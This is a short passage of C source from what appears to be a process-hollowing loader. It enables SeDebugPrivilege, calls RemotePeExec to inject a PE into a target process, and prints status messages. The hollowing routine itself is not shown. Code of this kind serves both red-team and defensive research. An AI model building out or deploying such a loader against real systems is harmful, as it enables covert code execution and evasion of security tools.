                    "[!] Failed to enable SeDebugPrivilege - run as Administrator\n");
            bResult = FALSE;
            goto _CLEANUP;
        }

        printf("[*] Native PE detected - starting process hollowing\n");
        bResult = RemotePeExec(pBuffer, pTargetProcess, PARMS);
    }

_CLEANUP:
    HeapFree(GetProcessHeap(), 0, pBuffer);

    if (bResult)
        printf("[+] Execution succeeded\n");
    else
        fprintf(stderr, "[-] Execution failed\n");

    return bResult ? 0 : -1;
}
